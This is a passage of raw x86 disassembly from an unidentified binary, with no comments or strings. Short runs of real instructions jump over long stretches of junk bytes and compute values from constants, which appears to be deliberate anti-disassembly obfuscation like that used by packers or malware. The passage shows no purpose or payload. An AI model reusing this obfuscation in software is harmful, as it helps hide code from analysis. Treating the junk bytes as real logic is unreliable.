  411ff5:	lea    eax,[ecx+eax*1-0x24bd751d]
  411ffc:	jmp    0x4120d8
  412001:	and    BYTE PTR [eax-0x59],al
  412004:	jo     0x411fed
  412006:	div    edi
  412008:	push   eax
  412009:	lods   eax,DWORD PTR ds:[esi]
  41200a:	out    0x35,al
  41200c:	(bad)  
  41200d:	sub    al,0xc1
  41200f:	xor    DWORD PTR [eax],edi
  412011:	popa   
  412012:	mov    BYTE PTR [eax],0x0
  412015:	mov    edi,0xd7000000
  41201a:	ds adc al,0xcf
  41201d:	sbb    ch,BYTE PTR [eax+0x161abefd]
  412023:	fwait
  412024:	enter  0xaa4b,0x13
  412028:	pop    ebp
  412029:	mov    ecx,0x38b646c5
  41202e:	sub    BYTE PTR [ebx],cl
  412030:	out    0x5f,al
  412032:	fld    st(1)
  412034:	jecxz  0x4120b0
  412036:	rcr    DWORD PTR [esi+0x8022bac],cl
  41203c:	in     al,dx
  41203d:	mov    al,0xf5
  41203f:	(bad)  
  412040:	cmp    dh,BYTE PTR [esi-0x49a3f336]
  412046:	and    DWORD PTR [ebp+0x6dae3f67],edx
  41204c:	in     eax,0x9d
  41204e:	pop    es
  41204f:	or     DWORD PTR [edi-0x77f91d55],0x622192b1
  412059:	dec    ebp
  41205a:	test   al,0x49
  41205c:	repz out dx,eax
  41205e:	les    edi,FWORD PTR [edx-0x1928091a]
  412064:	dec    esp
  412065:	loopne 0x4120e4
  412067:	and    dh,cl
  412069:	pop    esi
  41206a:	xor    BYTE PTR ds:0xfc48682a,bh
  412070:	push   ebx
  412071:	pop    ds
  412072:	or     DWORD PTR [ebp+edx*4-0x56],0xfbe24903
  41207a:	inc    esi
  41207b:	add    BYTE PTR [ebp+eiz*1-0x3573075c],bl
  412082:	mov    dh,0x89
  412084:	push   ebp
  412085:	jmp    0x9c78:0xe076e088
  41208c:	mov    esp,0x57be79aa
  412091:	or     DWORD PTR [ebx-0x57],ecx
  412094:	jl     0x41206f
  412096:	repz inc eax
  412098:	mov    ecx,0x4952f2d2
  41209d:	int3   
  41209e:	aam    0xed
  4120a0:	ss xchg edi,eax
  4120a2:	ins    DWORD PTR es:[edi],dx
  4120a3:	shr    BYTE PTR [ebx],0x6
  4120a6:	mov    ds,WORD PTR [edx+0xa]
  4120a9:	inc    ecx
  4120aa:	dec    esp
  4120ab:	adc    eax,0x9847dd04
  4120b0:	mov    dl,0xd9
  4120b2:	loop   0x4120fc
  4120b4:	rcr    esi,0x34
  4120b7:	cld    
  4120b8:	ret    
  4120b9:	mov    esi,0x61cf7e46
  4120be:	jmp    0x6034747e
  4120c3:	xchg   edx,eax
  4120c4:	push   es
  4120c5:	push   ss
  4120c6:	repz cmp eax,0xbff04b10
  4120cc:	pop    esi
  4120cd:	test   eax,0x706df27d
  4120d2:	and    DWORD PTR [ebx-0x17d8f307],esi
  4120d8:	mov    DWORD PTR [ebp-0x24],eax
  4120db:	jmp    0x4121b7
  4120e0:	push   ebp
  4120e1:	inc    ebp
  4120e2:	or     eax,0xd5d81d98
  4120e7:	int    0x84
  4120e9:	add    DWORD PTR [esp+ebx*1],ebx
  4120ec:	loope  0x412120
  4120ee:	mov    ah,0x3f
  4120f0:	and    bh,al
  4120f2:	add    BYTE PTR [eax],al
  4120f4:	mov    edi,0xb9000000
  4120f9:	push   ds
  4120fa:	fwait
  4120fb:	ret    0x6912
  4120fe:	or     ecx,DWORD PTR [ebx]
  412100:	pop    ecx
  412101:	or     BYTE PTR [esi],ah
  412103:	mov    ?,WORD PTR [edx+0x51]
  412106:	es dec esp
  412108:	mov    ecx,DWORD PTR [esi]
  41210a:	and    eax,0x321af861
  41210f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412110:	mov    WORD PTR [ecx+0x79f64861],?
  412116:	mov    ebp,0x4e002254
  41211b:	jae    0x41218f
  41211d:	or     edi,DWORD PTR [esp+edi*1+0x3b]
  412121:	inc    ebp
  412122:	dec    ebx
  412123:	cmp    esp,DWORD PTR [ebx]
  412125:	idiv   DWORD PTR [ebx-0xa]
  412128:	jp     0x4120ed
  41212a:	xor    bl,dh
  41212c:	xor    BYTE PTR [edi],0xc0
  41212f:	sbb    eax,DWORD PTR [ebx-0x3d]
  412132:	add    bl,BYTE PTR [ecx-0x33fd2cb1]
  412138:	fwait
  412139:	stos   DWORD PTR es:[edi],eax
  41213a:	mov    al,ds:0x501d0947
  41213f:	bound  esi,QWORD PTR [ecx]
  412141:	lea    esp,[eax+0x15]
  412144:	cmc    
  412145:	std    
  412146:	pop    ss
  412147:	leave  
  412148:	cld    
  412149:	push   ebx
  41214a:	sar    BYTE PTR [eax],cl
  41214c:	imul   ecx,DWORD PTR [ecx],0x7b068807
  412152:	adc    DWORD PTR [ebp-0x34385346],0xffffffc0
  412159:	ror    BYTE PTR [edx],cl
  41215b:	(bad)  
  41215d:	sbb    cl,BYTE PTR [edi+0x42]
  412160:	xchg   edi,eax
  412161:	nop
  412162:	test   BYTE PTR [ebx-0x79],0xd1
  412166:	stc    
  412167:	in     al,0xce
  412169:	clc    
  41216a:	push   0xffffffed
  41216c:	push   es
  41216d:	jnp    0x412120
  41216f:	sub    BYTE PTR [ebx+0x7b],0xab
  412173:	and    BYTE PTR [edi-0x27],bh
  412176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412177:	inc    edi
  412178:	vpmulhuw xmm7,xmm0,XMMWORD PTR [esi+0x5a9afb45]
  412180:	xor    esp,DWORD PTR [edx]
  412182:	jecxz  0x412150
  412184:	jne    0x4121fa
  412186:	fdivp  st(6),st
  412188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412189:	xchg   edx,eax
  41218a:	call   0xe1ca2196
  41218f:	push   ecx
  412190:	push   ss
  412191:	push   ecx
  412192:	pop    ebp
  412193:	retw   0x8de1
  412197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412198:	cmp    eax,0x19142b37
  41219d:	loope  0x412142
  41219f:	(bad)  
  4121a1:	adc    BYTE PTR [ebx],bl
  4121a3:	imul   esi,DWORD PTR [ebx-0x932f5a8],0x68
  4121aa:	in     al,0x27
  4121ac:	xchg   edx,eax
  4121ad:	sub    al,0x60
  4121af:	inc    edx
  4121b0:	cmp    al,0x14
  4121b2:	shr    BYTE PTR [ebx-0x38fccbcd],1
  4121b8:	inc    ebp
  4121b9:	aam    0x44
  4121bb:	imul   eax,DWORD PTR [eax],0xcc45c700
  4121c1:	push   0x31
  4121c3:	add    BYTE PTR [eax],al
  4121c5:	mov    DWORD PTR [ebp-0x3c],0xfb1
  4121cc:	mov    DWORD PTR [ebp-0x40],0x797b
  4121d3:	mov    DWORD PTR [ebp-0x44],0xb97
  4121da:	mov    DWORD PTR [ebp-0x48],0x6b06
  4121e1:	mov    ecx,DWORD PTR [ebp-0x48]
  4121e4:	and    ecx,0x2442
  4121ea:	mov    eax,0x2002
  4121ef:	sub    eax,ecx
  4121f1:	mov    ecx,DWORD PTR [ebp-0x44]
  4121f4:	jmp    0x4122d0
  4121f9:	dec    esp
  4121fa:	adc    DWORD PTR [edx],edx
  4121fc:	icebp  
  4121fd:	pop    edi
  4121fe:	repz out dx,eax
  412200:	mov    ebp,0x707c7b48
  412205:	push   ebx
  412206:	and    al,0x4
  412208:	ret    
  412209:	ffreep st(7)
  41220b:	add    BYTE PTR [eax],al
  41220d:	mov    edi,0xcd000000
  412212:	in     eax,dx
  412213:	rcr    bl,0x66
  412216:	dec    esi
  412217:	sub    BYTE PTR [eax],al
  412219:	cmp    eax,0xa518a074
  41221e:	mov    ch,0x7a
  412220:	stos   BYTE PTR es:[edi],al
  412221:	shr    BYTE PTR [edx+0x37],cl
  412224:	mov    esi,0x8acbfe7e
  412229:	test   al,0x28
  41222c:	outs   dx,DWORD PTR ds:[esi]
  41222d:	test   eax,0x39c539b
  412232:	jge    0x4121e0
  412234:	shl    BYTE PTR [ebx-0x8],1
  412237:	js     0x41221b
  412239:	push   es
  41223a:	inc    eax
  41223b:	dec    esp
  41223c:	stc    
  41223d:	xchg   esp,eax
  41223e:	mov    eax,0x1f5aba89
  412243:	(bad)
  412246:	cmc    
  412247:	or     ebx,DWORD PTR [edx]
  412249:	sbb    BYTE PTR [ebx+eax*8],ah
  41224c:	arpl   di,bp
  41224e:	push   0xffffffb1
  412250:	mov    ds:0x869c2c55,eax
  412255:	sahf   
  412256:	(bad)  
  412257:	mov    ch,0x33
  412259:	(bad)  
  41225a:	pop    eax
  41225b:	sbb    al,BYTE PTR [esi+0x6b]
  41225e:	push   ss
  41225f:	mov    BYTE PTR [edi+0x4f],ah
  412262:	imul   eax,ecx,0xa132316e
  412268:	mov    ah,0xff
  41226a:	fs gs cs inc ecx
  41226e:	mov    BYTE PTR [eax],0xb7
  412271:	inc    ebx
  412272:	xchg   ebp,eax
  412273:	jb     0x4122e6
  412275:	jne    0x41226f
  412277:	mov    ds:0x8947438a,al
  41227c:	rcr    eax,cl
  41227e:	pop    ebp
  41227f:	jmp    0x858f:0xbcb3a0e3
  412286:	in     eax,dx
  412287:	pop    ds
  412288:	js     0x4122b3
  41228a:	test   ecx,esp
  41228c:	daa    
  41228d:	add    BYTE PTR [edi+0x3a],ch
  412290:	js     0x41227e
  412292:	loop   0x4122d4
  412294:	cmp    ebx,DWORD PTR [ebx-0x3a96f92d]
  41229a:	test   BYTE PTR [ebp+0xe],cl
  41229d:	jns    0x412285
  41229f:	sar    DWORD PTR [ebx-0x15099acd],0xed
  4122a6:	push   ds
  4122a7:	push   es
  4122a8:	stos   DWORD PTR es:[edi],eax
  4122a9:	loope  0x4122f0
  4122ab:	stos   BYTE PTR es:[edi],al
  4122ac:	rol    DWORD PTR [edx],0x67
  4122af:	xchg   esp,eax
  4122b0:	aas    
  4122b1:	adc    al,0x2b
  4122b3:	(bad)  
  4122b4:	xlat   BYTE PTR ds:[ebx]
  4122b5:	mov    dl,0x5c
  4122b7:	jecxz  0x4122e6
  4122b9:	push   ss
  4122ba:	rcr    DWORD PTR [edi+0x1aa763d6],cl
  4122c0:	and    BYTE PTR [eax-0x36792d51],bl
  4122c6:	sahf   
  4122c7:	xchg   DWORD PTR [eax],edi
  4122c9:	sti    
  4122ca:	xor    eax,0x224650eb
  4122cf:	or     al,0x69
  4122d1:	rcr    cl,0x48
  4122d4:	add    BYTE PTR [eax],al
  4122d6:	mov    edx,DWORD PTR [ebp-0x40]
  4122d9:	shr    ecx,0x2
  4122dc:	jmp    0x4123b8
  4122e1:	mov    esp,0xfb7d6b6d
  4122e6:	jg     0x4122a6
  4122e8:	in     eax,dx
  4122e9:	adc    DWORD PTR [esi+0x2e8659f],edx
  4122ef:	retf   0x9ebb
  4122f2:	enter  0x0,0xbf
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	add    BYTE PTR [ebx-0x7fd41c26],cl
  4122fe:	mov    esp,0xa9ec167a
  412303:	inc    esi
  412304:	adc    bl,cl
  412306:	jae    0x4122e6
  412308:	cld    
  412309:	xor    BYTE PTR [ecx+edi*2],ch
  41230c:	aam    0xfe
  41230e:	test   eax,0xb170f0ab
  412313:	add    eax,0x4172fd47
  412318:	ins    BYTE PTR es:[edi],dx
  412319:	sti    
  41231a:	push   ebp
  41231b:	or     DWORD PTR [esi-0x17],esp
  41231e:	push   edx
  41231f:	push   ss
  412320:	jne    0x4122d6
  412322:	sub    dh,ch
  412324:	adc    eax,0x932c87db
  412329:	shl    cl,0x66
  41232c:	mov    eax,ds:0x85528bcc
  412331:	loop   0x4122ca
  412333:	shr    BYTE PTR ds:0x3aad68b5,cl
  412339:	or     al,0x4c
  41233b:	xchg   edx,eax
  41233c:	inc    edx
  41233d:	call   0x43c8:0xd5a2656d
  412344:	stos   BYTE PTR es:[edi],al
  412345:	add    esp,edx
  412347:	mov    al,0xa9
  412349:	xchg   ebp,eax
  41234a:	les    edi,FWORD PTR ds:0x4409b230
  412350:	mov    eax,0x4263a42f
  412355:	jl     0x412377
  412357:	fbld   TBYTE PTR [ecx-0x130e9bfa]
  41235d:	icebp  
  41235e:	xchg   ebx,eax
  41235f:	clc    
  412360:	out    dx,al
  412361:	xchg   ebp,eax
  412362:	call   0x9dd3:0xc164e426
  412369:	std    
  41236a:	test   BYTE PTR [esi-0x26b65a38],bh
  412370:	nop
  412371:	pop    ecx
  412372:	std    
  412373:	cmp    al,0xd3
  412375:	aad    0xdb
  412377:	dec    ecx
  412378:	hlt    
  412379:	inc    eax
  41237a:	add    esi,DWORD PTR [edx-0x4aeb7118]
  412380:	or     esi,DWORD PTR ss:[edx+eiz*4]
  412384:	xchg   DWORD PTR [edx+0x32],edx
  412387:	loope  0x412382
  412389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41238a:	jmp    0x23745867
  41238f:	hlt    
  412390:	cmp    DWORD PTR [edi+0x548ee973],ebx
  412396:	aaa    
  412397:	ja     0x4123ab
  412399:	ret    
  41239a:	in     eax,dx
  41239b:	test   DWORD PTR [ecx-0x62b5213c],ecx
  4123a1:	mov    edx,0x1d2603e9
  4123a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a7:	loop   0x41233a
  4123a9:	xchg   esp,eax
  4123aa:	cmp    al,0xf6
  4123ac:	add    dh,ah
  4123ae:	dec    eax
  4123af:	jbe    0x412350
  4123b1:	iret   
  4123b2:	dec    edx
  4123b3:	xor    eax,0xd4dd28e8
  4123b8:	imul   ecx,ecx,0x27d
  4123be:	or     ecx,edx
  4123c0:	jmp    0x41249c
  4123c5:	inc    esi
  4123c6:	inc    ebp
  4123c7:	shl    BYTE PTR [ecx],1
  4123c9:	shl    DWORD PTR [ebp+0x3e4377e7],cl
  4123cf:	popf   
  4123d0:	ins    DWORD PTR es:[edi],dx
  4123d1:	xchg   ebp,eax
  4123d2:	aam    0x37
  4123d4:	sbb    al,0x5d
  4123d6:	leave  
  4123d7:	add    BYTE PTR [eax],al
  4123d9:	mov    edi,0x99000000
  4123de:	inc    ecx
  4123df:	sbb    eax,0x4bf1465b
  4123e4:	add    cl,BYTE PTR [edx+eiz*2]
  4123e7:	div    BYTE PTR [esi+0x72]
  4123ea:	leave  
  4123eb:	inc    esi
  4123ec:	das    
  4123ed:	sar    dl,cl
  4123ef:	xchg   edi,eax
  4123f0:	xchg   ebx,eax
  4123f1:	mov    BYTE PTR [edx],dh
  4123f3:	sub    ecx,DWORD PTR [esi+0x2c]
  4123f6:	xchg   BYTE PTR [edx],dh
  4123f8:	push   edi
  4123f9:	dec    ebp
  4123fa:	pusha  
  4123fb:	sbb    al,0xc3
  4123fd:	ds scas al,BYTE PTR es:[edi]
  4123ff:	dec    ecx
  412400:	aas    
  412401:	ret    
  412402:	pop    edx
  412403:	and    BYTE PTR [ecx+0x4196b3f0],bl
  412409:	into   
  41240a:	in     eax,dx
  41240b:	loope  0x4123ef
  41240d:	mov    esp,0x44118b3e
  412412:	repz arpl WORD PTR [esi+0x7511e103],bx
  412419:	call   0x60c4:0x336e7d22
  412420:	(bad)  
  412421:	sti    
  412422:	jo     0x41243a
  412424:	adc    ch,BYTE PTR ds:0x2b38df24
  41242a:	dec    edx
  41242b:	pop    DWORD PTR [ebp+0x56e70e38]
  412431:	push   0xef5847e7
  412436:	cmp    eax,0x5021df3f
  41243b:	bnd jb 0x4124a8
  41243e:	xchg   edi,eax
  41243f:	mov    BYTE PTR [edx+0x404040b2],0x95
  412446:	jecxz  0x4123e7
  412448:	jmp    0x8f6b:0x3c0d289e
  41244f:	cmp    cl,0xfc
  412452:	cmp    esi,DWORD PTR [ecx-0x37]
  412455:	xor    BYTE PTR [edx],al
  412457:	mov    ebx,?
  412459:	clc    
  41245a:	scas   al,BYTE PTR es:[edi]
  41245b:	sub    bh,BYTE PTR [edx-0x7a]
  41245e:	mov    edi,0x8e94357
  412463:	ja     0x4124e3
  412465:	jb     0x412415
  412467:	ret    0x3ce5
  41246a:	arpl   WORD PTR [ebx-0x6f4b3326],ax
  412470:	sahf   
  412471:	retf   0xdf30
  412474:	and    BYTE PTR [edi+0x33],al
  412477:	cmp    al,0x84
  412479:	aad    0xb2
  41247b:	or     DWORD PTR [ecx+0xb],edx
  41247e:	sub    DWORD PTR [edi-0x3a],ebp
  412481:	mov    dl,0x24
  412483:	xchg   ebx,eax
  412484:	ds add al,0xec
  412487:	and    esi,eax
  412489:	push   ecx
  41248a:	add    BYTE PTR [ebp-0x79],dh
  41248d:	fiadd  DWORD PTR [edi+0x50]
  412490:	sbb    ch,dl
  412492:	sub    dl,al
  412494:	pop    esi
  412495:	add    al,0xbc
  412497:	pop    es
  412498:	fwait
  412499:	mov    eax,0x558b027e
  41249e:	cld    
  41249f:	xor    ecx,0x4992
  4124a5:	imul   ecx,ecx,0x2e84
  4124ab:	xor    ecx,0x4ec4dc24
  4124b1:	add    eax,DWORD PTR [ecx+edx*1+0x1c]
  4124b5:	mov    ecx,DWORD PTR [ebp-0x3c]
  4124b8:	mov    edx,DWORD PTR [ebp-0x34]
  4124bb:	and    ecx,0x1db
  4124c1:	imul   ecx,edx
  4124c4:	mov    edx,DWORD PTR [ebp-0x2c]
  4124c7:	sub    ecx,edx
  4124c9:	xor    ecx,0x4cfdc6
  4124cf:	add    ecx,eax
  4124d1:	add    ecx,DWORD PTR [ebp+0x8]
  4124d4:	xor    edi,edi
  4124d6:	mov    DWORD PTR [ebp-0x28],ecx
  4124d9:	mov    eax,DWORD PTR [ebp-0x4]
  4124dc:	jmp    0x4125b8
  4124e1:	push   ds
  4124e2:	pop    esp
  4124e3:	inc    esp
  4124e4:	test   eax,0xffffb946
  4124e9:	inc    edx
  4124ea:	out    0x58,eax
  4124ec:	mov    eax,ds:0x67145e07
  4124f1:	sbb    al,0xca
  4124f3:	add    BYTE PTR [eax],al
  4124f5:	mov    edi,0xc1000000
  4124fa:	push   ebp
  4124fb:	sub    DWORD PTR [eax],0xd03adf73
  412501:	ja     0x412543
  412503:	pop    ebp
  412504:	push   0xc132e897
  412509:	out    0xb,eax
  41250b:	cs call 0xae0e1223
  412511:	push   edi
  412512:	rol    DWORD PTR [ecx],0xb7
  412515:	push   esp
  412516:	stos   DWORD PTR es:[edi],eax
  412517:	xchg   esp,eax
  412518:	mov    ebp,0xb3511f0f
  41251d:	xchg   ecx,eax
  41251e:	fs inc esp
  412520:	push   cs
  412521:	add    BYTE PTR [esi],dl
  412523:	aam    0xe
  412525:	or     DWORD PTR [ebx-0x61],esi
  412528:	adc    BYTE PTR [esi-0x6308c2d9],bl
  41252e:	sbb    eax,esp
  412530:	stc    
  412531:	sub    al,0x74
  412533:	stos   BYTE PTR es:[edi],al
  412534:	(bad)  [ecx-0x7b77fbbe]
  41253a:	mov    dl,0x1b
  41253c:	dec    edi
  41253d:	push   esp
  41253e:	xchg   BYTE PTR [esi],al
  412540:	add    edi,DWORD PTR [ebx+0x2c37778c]
  412546:	jp     0x412507
  412548:	or     DWORD PTR [eax+0x32b701cd],0x60a651c7
  412552:	aam    0xf1
  412554:	movnti DWORD PTR [ecx-0x6e929cae],eax
  41255b:	mov    dl,0xad
  41255d:	loope  0x412508
  41255f:	gs xchg edx,eax
  412561:	outs   dx,DWORD PTR ds:[esi]
  412562:	nop
  412563:	popf   
  412564:	call   0xd0b5:0xe2ee677b
  41256b:	into   
  41256c:	js     0x4125b0
  41256e:	pop    edx
  41256f:	retf   0xc5d1
  412572:	scas   al,BYTE PTR es:[edi]
  412573:	dec    esi
  412574:	or     DWORD PTR [esi],edi
  412576:	xchg   ebp,eax
  412577:	cmp    al,0xc8
  412579:	cmp    eax,0x5441c1f
  41257e:	dec    esi
  41257f:	jb     0x4125ca
  412581:	add    BYTE PTR [ecx],0xe1
  412584:	push   0xffffffbd
  412586:	pusha  
  412587:	imul   DWORD PTR [edi+ecx*1+0x32]
  41258b:	mov    dl,0x3a
  41258d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258e:	in     eax,dx
  41258f:	ror    DWORD PTR [ebx],1
  412591:	push   0xeceac59
  412596:	jmp    0x2140:0x397150e
  41259d:	pop    ebp
  41259e:	cdq    
  41259f:	in     eax,dx
  4125a0:	pcmpgtd mm7,QWORD PTR ds:0xa014bef
  4125a7:	popa   
  4125a8:	mov    bl,0xf7
  4125aa:	test   BYTE PTR [edx-0x45],dh
  4125ad:	popf   
  4125ae:	sub    BYTE PTR [edx+0xd64e4d2],cl
  4125b4:	xor    edx,ecx
  4125b6:	outs   dx,BYTE PTR ds:[esi]
  4125b7:	mov    ebp,0x7839f633
  4125bc:	sbb    cl,ch
  4125be:	xlat   BYTE PTR ds:[ebx]
  4125bf:	add    BYTE PTR [eax],al
  4125c1:	add    BYTE PTR [ebx],dl
  4125c3:	cmp    edi,DWORD PTR [esi-0x3e]
  4125c6:	jle    0x41258f
  4125c8:	mov    edi,0x5c162cfb
  4125cd:	adc    DWORD PTR [edi-0x2440cfde],edx
  4125d3:	retf   0x0
  4125d6:	mov    edi,0xc1000000
  4125db:	mov    BYTE PTR [ebp+0x38],bl
  4125de:	aad    0xad
  4125e0:	sub    dl,dl
  4125e2:	pushf  
  4125e3:	in     eax,0xdf
  4125e5:	cld    
  4125e6:	push   edi
  4125e7:	fldenv [eax+ebp*8-0x1d80a5c0]
  4125ee:	dec    ebx
  4125ef:	int    0xeb
  4125f1:	rcr    BYTE PTR [ecx-0x40],1
  4125f4:	daa    
  4125f5:	jecxz  0x412613
  4125f7:	inc    ebx
  4125f8:	xchg   edx,eax
  4125f9:	or     BYTE PTR [ecx-0x778444c3],dh
  4125ff:	add    esp,DWORD PTR [esi-0x6eb080e9]
  412605:	mov    eax,0x861143d4
  41260a:	xchg   esp,eax
  41260b:	(bad)  
  41260c:	cmp    cl,BYTE PTR [ebx-0x31]
  41260f:	imul   edi,DWORD PTR [esi-0x16],0xa61cfa9d
  412616:	xor    ebp,DWORD PTR [edi]
  412618:	sbb    eax,0xe4136ba5
  41261d:	daa    
  41261e:	mov    eax,0x27429ef3
  412623:	jecxz  0x412612
  412625:	mov    bl,bl
  412627:	outs   dx,DWORD PTR ds:[esi]
  412628:	loopne 0x412674
  41262a:	out    dx,al
  41262b:	enter  0xecc7,0x47
  41262f:	out    dx,eax
  412630:	mov    cs,esi
  412632:	rol    BYTE PTR [esi+esi*1-0x6ce01b0a],1
  412639:	ins    DWORD PTR es:[edi],dx
  41263a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263b:	inc    eax
  41263c:	push   0xfffffffe
  41263e:	aaa    
  41263f:	fs ss jnp 0x412602
  412643:	rcr    DWORD PTR [edx+0x42bf8603],0x5f
  41264a:	or     al,0xfa
  41264c:	ds push cs
  41264e:	sbb    ch,bh
  412650:	jg     0x41261f
  412652:	dec    esi
  412653:	dec    edi
  412654:	(bad)  
  412655:	xchg   esp,eax
  412656:	loope  0x412624
  412658:	clc    
  412659:	adc    dl,BYTE PTR [ebx-0x3d]
  41265c:	adc    eax,0xdea805a4
  412661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412662:	lock jecxz 0x4126bc
  412665:	and    al,al
  412667:	fistp  QWORD PTR [ebx]
  412669:	dec    esi
  41266a:	sbb    ch,BYTE PTR [esi+eax*2-0x1b]
  41266e:	(bad)  
  41266f:	call   FWORD PTR [edi+0x26]
  412672:	ins    DWORD PTR es:[edi],dx
  412673:	jmp    0xd784f336
  412678:	sub    DWORD PTR [ebx-0x3f487435],edx
  41267e:	xor    bl,ah
  412680:	(bad)  
  412681:	enter  0xa8c7,0xa6
  412685:	bound  edx,QWORD PTR [esi+0xa9b32b2]
  41268b:	inc    ebp
  41268c:	ins    BYTE PTR es:[edi],dx
  41268d:	pop    es
  41268e:	add    eax,0x83407b46
  412693:	les    ecx,FWORD PTR [edx+ebx*2]
  412696:	or     eax,0x840fd0b9
  41269b:	inc    DWORD PTR [ecx]
  41269d:	add    BYTE PTR [eax],al
  41269f:	mov    eax,DWORD PTR [ebp-0x1c]
  4126a2:	jmp    0x41277e
  4126a7:	add    al,0x70
  4126a9:	mov    dl,0xdf
  4126ab:	neg    bh
  4126ad:	ins    DWORD PTR es:[edi],dx
  4126ae:	sti    
  4126af:	(bad)  
  4126b0:	scas   eax,DWORD PTR es:[edi]
  4126b1:	cmp    DWORD PTR [ebx-0x609e4028],0xcb9a
  4126bb:	mov    edi,0x31000000
  4126c0:	mov    ch,0xfb
  4126c2:	mov    ds:0xfe4c9725,eax
  4126c7:	rcl    esp,0x63
  4126ca:	or     BYTE PTR [esi+0x2d],bl
  4126cd:	xchg   ecx,eax
  4126ce:	fcmovnb st,st(7)
  4126d0:	retf   
  4126d1:	jecxz  0x412748
  4126d3:	into   
  4126d4:	adc    DWORD PTR [eiz*8-0x24bf4f65],ebp
  4126db:	adc    DWORD PTR [edi+0x342f6c8c],ebp
  4126e1:	dec    ecx
  4126e2:	push   0x17
  4126e4:	mov    ecx,0x30b3fca6
  4126e9:	enter  0x552e,0x82
  4126ed:	adc    ch,ah
  4126ef:	test   eax,0xfb4cba78
  4126f4:	adc    eax,ebx
  4126f6:	stos   BYTE PTR es:[edi],al
  4126f7:	out    0x17,al
  4126f9:	sahf   
  4126fa:	push   0xffffffbc
  4126fc:	ins    DWORD PTR es:[edi],dx
  4126fd:	fwait
  4126fe:	pop    edx
  4126ff:	scas   al,BYTE PTR es:[edi]
  412700:	and    eax,0x3b8462d
  412705:	stos   DWORD PTR es:[edi],eax
  412706:	jp     0x41270f
  412708:	imul   edx,edi,0xf2e7948b
  41270e:	cld    
  41270f:	mov    WORD PTR [edi+0x43cfd0ee],gs
  412715:	add    bl,ah
  412717:	jns    0x412709
  412719:	jp     0x412730
  41271b:	mov    esp,0xa7cbbb30
  412720:	fimul  DWORD PTR [edx+0x40248288]
  412726:	ins    DWORD PTR es:[edi],dx
  412727:	adc    dh,BYTE PTR [edx]
  412729:	jno    0x412784
  41272b:	adc    eax,DWORD PTR [edx+0x6]
  41272e:	push   ecx
  41272f:	sbb    cl,BYTE PTR [ecx]
  412731:	int    0xcd
  412733:	fldenv [esi-0x286171f4]
  412739:	xor    DWORD PTR [edi-0x239c90dc],edx
  41273f:	shl    BYTE PTR [ecx],0xad
  412742:	sub    al,0x46
  412744:	inc    ebx
  412745:	xchg   esi,eax
  412746:	mov    cl,0xdd
  412748:	ror    BYTE PTR [edx],0x78
  41274b:	xor    BYTE PTR [edi+0x4c],al
  41274e:	rol    DWORD PTR [ebx+0x7b],cl
  412751:	les    ecx,FWORD PTR ds:0x45b5
  412756:	daa    
  412757:	pop    esp
  412758:	das    
  412759:	xor    ah,BYTE PTR [ebp+0x679c0471]
  41275f:	clc    
  412760:	and    BYTE PTR [edi+0x3f],bh
  412763:	mov    ah,0x6d
  412765:	loop   0x4126f9
  412767:	out    dx,al
  412768:	adc    edi,ecx
  41276a:	inc    ebx
  41276b:	and    esp,edx
  41276d:	lahf   
  41276e:	out    0xbf,eax
  412770:	loope  0x4127a6
  412772:	rcl    bl,cl
  412774:	push   0x465d587b
  412779:	in     eax,0xe9
  41277b:	std    
  41277c:	test   DWORD PTR [eax],esi
  41277e:	mov    ecx,DWORD PTR [ebp+0x8]
  412781:	add    ecx,DWORD PTR [eax+esi*4]
  412784:	mov    DWORD PTR [ebp-0x20],ecx
  412787:	push   DWORD PTR [ebp-0x20]
  41278a:	push   DWORD PTR [ebp+0xc]
  41278d:	call   0x42d691
  412792:	jmp    0x41286e
  412797:	cwde   
  412798:	arpl   WORD PTR [edx-0x5e],bp
  41279b:	sti    
  41279c:	stos   DWORD PTR es:[edi],eax
  41279d:	fdivr  DWORD PTR [ebx+0x49]
  4127a0:	in     eax,0xe9
  4127a2:	xchg   ebp,eax
  4127a3:	xchg   esi,eax
  4127a4:	fadd   st(0),st
  4127a6:	jo     0x412801
  4127a8:	int3   
  4127a9:	add    BYTE PTR [eax],al
  4127ab:	mov    edi,0x3c000000
  4127b0:	shl    edx,0xde
  4127b3:	aam    0x8d
  4127b5:	xchg   esp,eax
  4127b6:	jno    0x412809
  4127b8:	enter  0x7420,0xe6
  4127bc:	test   al,0x9d
  4127be:	or     al,0x8b
  4127c0:	jo     0x412822
  4127c2:	jmp    0x21f5:0xc2027e01
  4127c9:	xlat   BYTE PTR ds:[ebx]
  4127ca:	icebp  
  4127cb:	ret    0xd6ee
  4127ce:	mov    ch,0x4
  4127d0:	in     al,0xb6
  4127d2:	enter  0x2fd4,0xc0
  4127d6:	push   cs
  4127d7:	add    BYTE PTR [esi+0x6d439539],cl
  4127dd:	lds    edx,FWORD PTR [esi+eax*8-0x66e3494a]
  4127e4:	leave  
  4127e5:	fbstp  TBYTE PTR [ebx+0x21]
  4127e8:	cdq    
  4127e9:	fld    QWORD PTR [edi+esi*1]
  4127ec:	inc    ecx
  4127ed:	mov    eax,0x5b57bde3
  4127f2:	dec    edx
  4127f3:	add    dl,BYTE PTR [edi+0x50e1e376]
  4127f9:	pusha  
  4127fa:	ins    DWORD PTR es:[edi],dx
  4127fb:	stc    
  4127fc:	into   
  4127fd:	dec    esi
  4127fe:	mov    bh,bl
  412800:	in     eax,0x48
  412802:	xor    ch,cl
  412804:	inc    esp
  412805:	mov    bh,0xc9
  412807:	ret    0xe2d3
  41280a:	call   0x494549a1
  41280f:	ds and al,0x5c
  412812:	scas   al,BYTE PTR es:[edi]
  412813:	sbb    bl,BYTE PTR [ebp+0x4ad2f932]
  412819:	adc    ecx,DWORD PTR [eax-0x5c0d1d6a]
  41281f:	jl     0x41285d
  412821:	mov    bl,0x1f
  412823:	mov    al,0xa2
  412825:	enter  0x27a4,0xfd
  412829:	add    BYTE PTR [esi],cl
  41282b:	xor    eax,0x65348144
  412830:	or     BYTE PTR [esi+esi*8+0x7ec71e70],0xf7
  412838:	mov    ecx,0x3a637ff3
